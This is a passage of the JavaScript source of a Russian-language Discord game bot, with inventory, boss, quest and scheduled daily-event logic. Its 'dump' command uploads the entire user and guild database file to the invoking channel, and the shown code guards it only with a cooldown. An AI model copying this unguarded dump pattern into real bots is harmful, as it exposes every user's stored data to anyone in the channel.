        ending: (count) => `💖 ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `💖 Бонус "Монстр-защитник" ${ count }/1`
      },
      {
        key: "voidThief",
        names: ["бонусы от перчаток", "voidthief"],
        ending: (count) => `💠 ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `💠 Бонус "Бонусы от перчаток" ${ count }`
      },
      {
        key: "voidMysticClover",
        names: ["умение заворож. клевер", "умение заворожить клевер", "заворожение клевера", "заворожить клевер", "заворожения клевера", "voidmysticclover"],
        ending: (count) => `🍵 ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `🍵 Бонус "Умение заворож. Клевер" ${ count }/50`
      },
      {
        key: "voidTreeFarm",
        names: ["фермер", "фермеров", "фермера", "voidtreefarm"],
        ending: (count) => `📕 ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `📕 Бонус "Фермер" ${ count }`
      },
      {
        key: "voidCasino",
        names: ["казино", "voidcasino"],
        limit: 1,
        ending: (count) => `🥂 ${ ending(count, "Бонус", "ов", "", "а") }`,
        display: (count) => `🥂 Бонус "Казино" ${ count }/1`
      }
    ];

    ITEMS.forEach(item => item.__proto__ = ItemTaker.prototype);




    const displayBag = () => {

      const items = Object.entries( user.bag || {} )
        .map(([key, count]) => ({
          itemData: ITEMS.find(item => item.key === key),
          count
        }))
        .filter(({itemData}) => itemData !== undefined)
        .map(({itemData, count}) => itemData.display(count))
        .map(str => `– ${ str }`);


      const description = items.length ?
        items.join("\n") :
        "Она пустая!! Гады, положите туда что-нибудь..\n!bag put 1 coin";

      const embed = {
        description,
        footer: {
          text: `Ты, Сэр ${ msg.author.tag }`,
          iconURL: msg.author.avatarURL()
        }
      }
      msg.msg("Сэр, Ваша сумка?", embed);
      return;
    };




    const moveItem = (key, count, isToBag) => {

      const item = ITEMS.find(item => item.key === key);
      const targetFrom = isToBag ?   user   : user.bag;
      const targetTo   = isToBag ? user.bag : user;

      if (count === "+"){

        const value = item.getter({ target: targetFrom });
        count = nonNaN( value );
      }
      count = Math.max(Math.floor( count ), 0);


      if (user[key] === undefined)
        item.setter({ count: 0, target: user });

      if (user.bag[key] === undefined)
        item.setter({ count: 0, target: user.bag });

      const currentCount = item.getter({ target: targetFrom });
      if (currentCount < count){
        const description = `Надо на ${ item.ending(count - currentCount) } больше!`;
        msg.msg("Недостаточно ресурса", {delete: 7000, description});
        return;
      }

      if (item.getLimit() && !isToBag){
        const current = item.getter({ target: targetTo });
        const limit = item.getLimit();
        count = Math.min(count, limit - current);
      }


      item.setter({
        target: targetFrom,
        count: item.getter({ target: targetFrom }) - count
      })
      item.setter({
        target: targetTo,
        count: item.getter({ target: targetTo   }) + count
      })

      const bagDescription = isToBag ? "в а-ля вакуумный объект" : "из черной дыры";
      const description = `Вы успешно ${ isToBag ? "положили" : "взяли" } ${ item.ending(count) } ${ bagDescription }.`;
      msg.msg(`Действие с сумка ${ msg.author.tag }`, {delete: 9000, description});
    }


    let action = op.args.match(/взять|take|положить|put/);
    action = action && action[0];

    let count = op.args.match(/\d+|\+/);
    count = count && count[0];
    let item;

    if (action && count){
      op.args = op.args.replace(action, "");
      op.args = op.args.replace(count, "");
      const itemName = op.args = op.args.trim().toLowerCase();

      item = ITEMS.find(item => item.names.includes(itemName));
      if (!item){
        const list = ITEMS.reduce((acc, item) => acc.concat(item.names), []);
        const similarItem = getSimilar(list, itemName);
        msg.msg("Не удалось найти такой предмет:", {description: `\`${ itemName }\`${ similarItem ? `\n\nВозможно, Вы имели ввиду: ${ similarItem }?` : "" }`, delete: 7000});
      }
    }



    // Run;

    if (item){
      const isToBag = action === "положить" || action === "put";

      if (!user.bag)
        user.bag = {};

      moveItem(item.key, count, isToBag);
      return;
    }

    displayBag();
    return;
  }, {type: "user", delete: true}, "сумка рюкзак"),

  boss: new Command(async (msg, op) => {
    const member = op.memb ?? msg.author;

    msg.author.action("callBossCommand", {msg, op});

    const guild = msg.guild;
    const boss = guild.data.boss;

    if (boss === undefined){
      msg.msg("", {description: "Момент появления босса пока неизвестен", color: "000000"});
      return
    }

    if (boss.apparanceDate){
      msg.msg("", {description: `Прибудет лишь ${ toDayDate(boss.apparanceAtDay * 86_400_000) }`, color: "000000"});
      return;
    }

    const currentHealthPointPercent = Math.ceil((1 - boss.damageTaken / boss.healthThresholder) * 100);
    const description = `Уровень: ${ boss.level }.\nУйдет ${ toDayDate(boss.endingAtDay * 86_400_000) }\n\nПроцент здоровья: ${ currentHealthPointPercent }%`;
    const reactions = ["⚔️", "🕋"];
    const fields = [
      {
        name: "Пользователь",
        value: Object.entries(BossManager.getUserStats(boss, member.id))
          .map(([key, value]) => `${ key }: ${ Util.toLocaleDelevoperString(value) }`)
          .join("\n")
        
      }
    ];

    const embed = {
      title: "",
      description,
      reactions,
      fields,
      thumbnail: "https://media.discordapp.net/attachments/629546680840093696/1038714401861161000/pngegg_1.png?width=595&height=593",
      footer: {text: member.tag, iconURL: member.avatarURL()}
    }
    const message = await msg.msg(embed.title, embed);
    
    const collector = message.createReactionCollector((reaction, user) => user.id !== client.user.id && reactions.includes(reaction.emoji.name), {time: 60_000});
    collector.on("collect", async (reaction, user) => {
      reaction.users.remove(user);

      if (reaction.emoji.name === "⚔️"){
        BossManager.userAttack({boss, user, channel: message.channel});
      }

      if (reaction.emoji.name === "🕋"){
        BossManager.createShop({channel: message.channel, user, guild: message.guild});
      }
    });

    collector.on("end", () => message.reactions.removeAll());

  }, {type: "other"}, "босс"),

  dump: new Command(async (msg, op) => {
    data_save();
    const message = await msg.channel.send({
      files: [{
        attachment: "main/data.json",
        name: new Intl.DateTimeFormat("ru-ru", {year: "numeric", month: "numeric", day: "numeric", hour: "numeric", minute: "numeric"}).format()
      }]
    });

    setTimeout(() => message.delete(), 1_000_000);
  }, {type: "other", cooldown: 100}, "дамп")
}

const quests = {
  scope: "onlyCoin&1&9&1.2 messagesFountain&30&1&1.5 messagesFountain&280&7&4 like&1&5 praiseMe&1&5 namebot&2&5 berryActive&2&2", //name progress chance complexity id
  undefined: "Квесты выполнены.",
  messagesFountain: "Отправьте сообщения",
  like: "Поставьте лайк своему другу!",
  praiseMe: "Дождитесь, пока вас похвалят",
  namebot: "Назовите бота глупым",
  setBirthday: "Установите дату своего дня рождения.",
  birthdayParty: "Сегодня у одного из участников день рождения,\nпоздравьте его!🎉",
  inviteFriend: "Пригласите друга на сервер!",
  dailyChest: "Загляните в сегодняшний сундук,\nтам наверное что-то интересное", // dailyChest&1&2
  beEaten: "Будьте съедены!",
  thief: "Успешно совершите кражу 7 раз подряд.",
  hopeless: "Это достижение дается всем, кого ограбили больше 10 раз подряд.",
  crazy: "Украдите у пользователя, у которого никто не смог украсть.",
  day100: "Выполните 100 ежедневных квестов!",
  berryActive: "Купите или продайте клубнику",
  firstChest: "Откройте сундук в знак наступающих весёлостей",
  buyFromGrempen: "Купите любую вещь у гремпенса", //  buyFromGrempen&1&5&1.5
  guildNewRecord: "Ваша гильдия должна побить\nрекорд по ежедневным сообщениям", //guildNewRecord&1&5&3
  cleanShop: "Опустошите лавку всего за один день.",
  bigHungredBonus: "Откройте сундук, в котором будет по меньшей мере 99 ключей.",
  completeTheGame: "Пройдите призрака — познайте каждый кусочек его возможностей и достигните конца всей истории.",
  cloverInstability: "Признайтесь, вы счастливчик \\✔",
  onlyCoin: "Выбейте коин из сообщений",

  names: {
    inviteFriend: "Первый друг&375",
    setBirthday: "Операция тортик&500",
    beEaten: "Быть съеденным&300",
    thief: "Серия #7&377",
    //hopeless: "Безнадёжный&1500",
    crazy: "Разумно-безумен&900",
    day100: "Квесто-выжималка&1175",
    firstChest: "Новое приключение&200",
    bigHungredBonus: "Большая стопка&1002",
    cleanShop: "Снова пусто&961",
    completeTheGame: "В конце-концов&0",
    cloverInstability: "Нестабилити&900"
  }
}

const timeEvents = {
  day_stats: function (isLost){
    let next = new Date(getTime() + 14500000).setHours(20, 0, 0) - getTime();
    if (isLost) return new TimeEvent("day_stats", next);

    client.guilds.cache.filter(e => e.data.treeLevel).each(guild => {
      let messagesNeed = (  [0, 70, 120, 180, 255, 370, 490, 610, 730, 930, 1270, 1500, 1720, 2200, 2700, 3200, 3700, 4500, 5200, 6000, 10000][guild.data.treeLevel] + (guild.memberCount * 3) + ((guild.data.day_average || 0) / 5)  ) * ("treeMisstakes" in guild.data ? 1 - 0.1 * guild.data.treeMisstakes : 1);
      // Сезонное снижение
      messagesNeed = Math.floor(messagesNeed / 3);

      if (guild.data.day_msg < messagesNeed){
        guild.data.treeMisstakes = nonNaN(guild.data.treeMisstakes) + 0.2 + Number( (1 - guild.data.day_msg / messagesNeed).toFixed(1) );
        guild.data.misstake = messagesNeed;

        if (guild.data.treeMisstakes >= 4){
          delete guild.data.treeMisstakes;
          guild.data.treeLevel--;
        }

        return;
      }

      guild.data.treeMisstakes = nonNaN(guild.data.treeMisstakes) - 0.2;

      if (guild.data.treeMisstakes <= 0)
        delete guild.data.treeMisstakes;


    });

    client.guilds.cache.forEach(guild => {
      let data = guild.data;
      let msgs = data.day_msg || 0;

      let misstake = data.misstake;
      delete data.misstake;

      guild.data.coins += 2 * guild.memberCount;

      data.days = data.days + 1 || 1;
      data.msg_total = data.msg_total + msgs || msgs;


      let description = `За этот день было отправлено ${ending(msgs, "сообщени", "й", "е", "я")}\nРекордное количество: ${data.day_max || (data.day_max = 0)}`;

      if (data.days > 3) {
        description += `\nВсего сообщений: ${Math.letters(data.msg_total)}\nВ среднем за день: ${Math.round(data.msg_total / data.days)}`;
      }

      if (data.day_max < msgs) {
        data.day_max = msgs;
        description += `\nГильдия ${["<a:jeqery:768047102503944202>", "<a:jeqeryBlue:806176327223738409>", "<a:jeqeryPurple:806176181140848660>", "<a:jeqeryGreen:806176083757105162>", "<a:jeqeryRed:806175947447205958>", "<a:blockPink:794615199361400874>", "<a:blockAqua:794166748085223475>"].random()} установила свой рекорд по сообщениям!`;
        // guild.members.cache.map(e => e.user).filter(e => !e.bot).forEach(e => e.quest("guildNewRecord"));
      }


      data.day_msg = 0;

      if (!msgs){
        return;
        // description = ["Сегодня не было отправленно ни одно сообщение", "Сегодня на сервере пусто", "За целый день ни один смертный не проявил активность", "Похоже, тишина — второе имя этого сервера"].random();
      }

      if (misstake)
        description += `\n\nДерево засыхает! Ему необходимо на ${ ending(misstake - msgs, "сообщени", "й", "е", "я") } больше 💧`;

      guild.chatSend("Статистика сервера", { description: description });
    });



    client.guilds.cache.filter(e => e.data.professions).each(guild => {
      let workers = new Set();
      let costs = 0;
      let entries = Object.entries(guild.data.professions);
      if (!entries.length){
        delete guild.data.professions;
        return;
      }


      entries = entries.filter(([id]) => guild.roles.cache.get(id) ? true : delete guild.data.professions[id]);

      guild.members.cache.each(memb => {
        entries.forEach(([id, cost]) => memb.roles.cache.has(id) ? workers.add(memb) && (costs += +cost) : false);
      });
      if (guild.data.coins < costs){
        guild.logSend(`Сегодня не были выданы зарплаты`, {description: `В казне сервера слишком мало коинов, лишь ${guild.data.coins}, в то время как на выплаты требуется ${costs} <:coin:637533074879414272>`, color: "ffff00"});
        return;
      }

      [...workers].forEach(memb => {
        entries.forEach(([id, cost]) => memb.roles.cache.has(id) ? memb.user.data.coins += +cost : false);
      });
      guild.data.coins -= costs;
      guild.logSend(`Были выданы зарплаты`, {description: `С казны было автоматически списано ${ending(costs, "коин", "ов", "", "а")} на заработные платы пользователям\nИх список вы можете просмотреть в команде \`!банк\`\nУчастников получило коины: ${workers.size}`});

    });

    client.guilds.cache
      .each((guild) => BossManager.beforeApparance(guild));


    data_save();
    return new TimeEvent("day_stats", next);
  },

  cooledBot: function (isLost, guildId){
    if (!guildId) throw "Ивент без аргументов";
    delete data.guilds.find((el) => el.id == guildId).stupid_evil;
    data_save();
  },

  new_day: async function (isLost){
    let next = new Date(getTime() + 14500000).setHours(23, 59, 50) - getTime();
    new TimeEvent("new_day", next);

    if (isLost){
      return;
    }

    if (data.bot.clearParty) {
      delete data.bot.clearParty
      quests.scope = quests.scope.replace(/birthdayParty(\.+?)(?:\s|$)/g, "");
    }
    await delay(20000);

    const today = toDayDate( new Date() );
    let birthdaysToday = 0;
    data.bot.dayDate = today;
    data.bot.currentDay = Math.floor(Date.now() / 86_400_000);

    client.guilds.cache
      .each((guild) => BossManager.bossApparance(guild));

    client.users.cache.filter(memb => !memb.bot && memb.data.BDay === today).forEach(memb => {
        birthdaysToday++;
        memb.guilds.forEach(guild => quests.scope += " birthdayParty&1&2&3&" + guild.id);
    });

    if (birthdaysToday){
      console.info(`Сегодня день рождения у ${ birthdaysToday } пользователя(ей)`);
      data.bot.clearParty = birthdaysToday;
    }


    let berryRandom = [{_weight: 10, prise: 1}, {_weight: 1, prise: -7}, {_weight: 5, prise: 3}].random({weights: true}).prise;
    let berryTarget = Math.sqrt(client.users.cache.size / 3) * 7 + 200;
    data.bot.berrysPrise += Math.round((berryTarget - data.bot.berrysPrise) / 30 + berryRandom);

    data.bot.grempen = "";
    let arr = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e"]; //0123456789abcdef
    for (let i = 1; i < 7; i++) {
      data.bot.grempen += arr.random({pop: true});
    }

    data.guilds.forEach(e => e.commandsLaunched = Object.values(e.commandsUsed).reduce((acc, e) => acc + e, 0));
    let commandsLaunched = Object.values(data.bot.commandsUsed).reduce( ((acc, e) => acc + e), 0);
    console.info(`\n\n\n      —— Ежедневная статистика\n\nСерверов: ${data.guilds.length}\nПользователей: ${data.users.length}\nКаналов: ${client.channels.cache.size}\n\nЦена клубники: ${data.bot.berrysPrise}\nВыполнено команд: ${commandsLaunched - data.bot.commandsLaunched}\nВыполнено команд по серверам:\n${data.guilds.map(e => e.name + ":\nВыполнено команд: " + e.commandsLaunched + "\nРекорд сообщений: " + e.day_max).join("\n")}\n\n`);
    data.bot.commandsLaunched = commandsLaunched;

    data_save();
  },

  postpone: async function (isLost, author, channelId, msg){
    if (isLost) client.users.cache.get(author).msg("Ваше сообщение не было доставлено вовремя, так как в тот момент я был отключён :(", {description: msg});
    let channel = client.channels.cache.get(channelId);
    if (!channel) return;
    author = channel.guild.members.cache.get(author);
    let webhook = await channel.createWebhook(author.displayName, {avatar: author.user.avatarURL()});
    await webhook.msg(msg, {embed: true});
    webhook.delete();
  },

  remind: async function (isLost, authorId, channelId, phrase){
    const channel = client.channels.cache.get(channelId);
    const author  = client.users.cache.get(authorId);

    const target = channel || author;
    const description = phrase[0].toUpperCase() + phrase.slice(1) + "\n" + author.toString();
    target.msg("Напоминание:", {description, footer: isLost ? null : "Ваше напоминание не было доставлено вовремя. Я был отключён."});
  },

  giveaway: async function (isLost, channelId, messageId, winners, roleId){
    let channel = client.channels.cache.get("" + channelId);
    let giveaway = await channel.messages.fetch(messageId);
    if (!giveaway) {
      return;
    }

    let users = await giveaway.reactions.resolve("🌲").users.fetch();

    winners = users.filter(e => !e.bot).random(+winners).filter(e => e);
    giveaway.msg(giveaway.embeds[0].title, {color: "7ab160", edit: true, description: giveaway.embeds[0].description + (winners[0] ? `\n\nВсего участвующих: ${users.filter(e => !e.bot).size}\nПобедителей: ${winners.length} 🌲` : "\n**Нет участников, нет и победителей..**"), footer: {text: "Раздача завершена"}, timestamp: giveaway.embeds[0].timestamp});
    if (!winners[0]) {
      return;
    }
    client.api.channels(channelId).messages.post({data: {"embed": {"title": "Привет, удача — раздача завершена!", "color": 	8040800, "description": `${winners.map(e => ["🍃", "☘️", "🌿", "🌱", "🌼"].random() + " " + e.toString()).join("\n")}\nвы выиграли!`, footer: {"text": "Мира и удачи всем"}}, "content": "", "message_reference": {message_id: messageId}}});

    if (roleId) {
      winners.forEach(e => channel.guild.member(e).roles.add(roleId, "Win In Giveway"));
    }
    await delay(1000);
    giveaway.reactions.cache.get("🌲").remove();
  },

  autosave: function(isLost){
    data_save();
    return new TimeEvent("autosave", 7200000);
  },

  cloverEnd: function(isLost, guildId, channelId){
    let guild = client.guilds.cache.get(guildId);
    if (!guild){
      return;
    }
    let effect = guild.data.cloverEffect;

    let channel = guild.channels.cache.get(channelId);
    let multiplier = 1.08 + (0.07 * ((1 - 0.9242 ** effect.uses) / (1 - 0.9242)));
    channel.msg("☘️ Ивент Клевера завершился", {color: "21c96c", description: `Получено наград во время действия эффекта: ${effect.coins}\nМаксимальный множитель: X${multiplier.toFixed(2)}\nКуплено клеверов: ${effect.uses}\nКлевер длился ${((getTime() - effect.timestamp) / 3600000).toFixed(1)}ч.`});
    delete guild.data.cloverEffect;
  },

  offMuteAutomatic: function(isLost, guildId, memberId){
    let guild = client.guilds.cache.get(guildId);
    let member = guild.member(memberId);
    if ( !member.roles.cache.get(guild.data.mute_role) ){
      return;
    }

    guild.logSend("Действие мута завершено", {description: `С участника по прошедствию времени автоматически сняты ограничения на общения в чатах.`, author: {name: member.displayName, iconURL: member.user.displayAvatarURL()}});
    member.roles.remove(guild.data.mute_role);
  },

  curseTimeoutEnd: function(isLost, userId, timestamp){
    const user = client.users.cache.get(userId);
    const curses = user.data.curses;
    
    const compare = curse => curse.timestamp === timestamp;
    const curse = curses.find(compare);

    if (!curse){
      return;
    }

    CurseManager.checkAvailable({user, curse});
  }
};


//---------------------------------{#End--}------------------------------                            #ff0

(() => {
  let cleanTimestamp = getTime();
  data.users.forEach(user =>
    Object.keys(user).forEach(key => key.startsWith("CD") && user[key] < cleanTimestamp ? delete user[key] : false)
  );
  data.users = data.users.sort((a, b) => b.level - a.level);
})()

getSaves();
// data.users.forEach((item, i) => {
//   for (e in item){
//     if (item[e] === null || item[e] === NaN){
//       console.info(e + " - " + item[e]);
//       item[e] = 0;
//     }
//   }
// });
//
// data.guilds.forEach((item, i) => {
//   for (e in item){
//     if (item[e] === null || item[e] === NaN){
//       console.info(e + " - " + item[e]);
//       item[e] = 0;
//     }
//   }
// });
//
// x = [];
// data.users.forEach(item => {
//   Object.keys(item).forEach(e => {
//     if (!x.includes(e)) x.push(e);
//   })
// });
//
// console.info(x);
// x = [];
//
// data.guilds.forEach(item => {
//   Object.keys(item).forEach(e => {
//     if (!x.includes(e)) x.push(e);
//   })
// });
// console.info(x);
//
// !eval console.info(Object.keys(commands).map(e => e + " " + commands[e].id));

await TimeEvent.loadEventFromFile();
await ReactionsManager.loadReactionsFromFile();
await CounterManager.loadCountersFromFile();

setTimeout(() => client.login(process.env.DISCORD_TOKEN), 100);
// <:coin:637533074879414272> <a:void:768047066890895360>



/*
ᅠᅠ💢
──────▄▀▄─────▄▀▄
─────▄█░░▀▀▀▀▀░░█▄
─▄▄──█░░░░░░░░░░░█──▄▄
█▄▄█─█░░▀░░┬░░▀░░█─█▄▄█
**
𝗨𝗦𝗘𝗥
id
name
coins
coinsPerMessage
level
exp
berrys
void
keys
chestLevel
chestBonus
praiseMe
praise
BDay
profile_description
profile_color

last_online

quest
completedQuest
questNeed
questReward
questTime
questProgress
dayQuests

grempen
shopTime

thiefWins
thiefGloves

CD_3          // user
CD_5          // like
CD_7          // warn
CD_10         // archive
CD_19         // reactor
CD_23         // emojis
CD_24         // idea
CD_25         // grempen
CD_27         // berry
CD_31         // iq
CD_32         // chest
CD_40         // editServer

give_first
praise_first
reactor_first
embeds_first
tieRoles_first
guildCommand_first

𝗚𝗨𝗜𝗟𝗗
id
name
day_msg
day_max
msg_total
days
commandsLaunched

mute_role
chatChannel
logChannel
stupid_evil

leave_roles

𝗠𝗜𝗡𝗜𝗠𝗔𝗣 𝗔𝗡𝗖𝗛𝗢𝗥
**
●▬▬▬▬▬▬ஜ۩۞۩ஜ▬▬▬▬▬●


𝗥𝗨𝗟𝗘𝗦
server = guild.data
guild  = client.guilds
user   = memb.data;
member = client.guilds.users!
memb   = client.users!

*/


console.info(  timestampToDate(    ((new Date().getHours() < 20) ? (new Date().setHours(20, 0, 0)) : (new Date(getTime() + 14500000).setHours(20, 0, 0)))  - getTime()  )  );
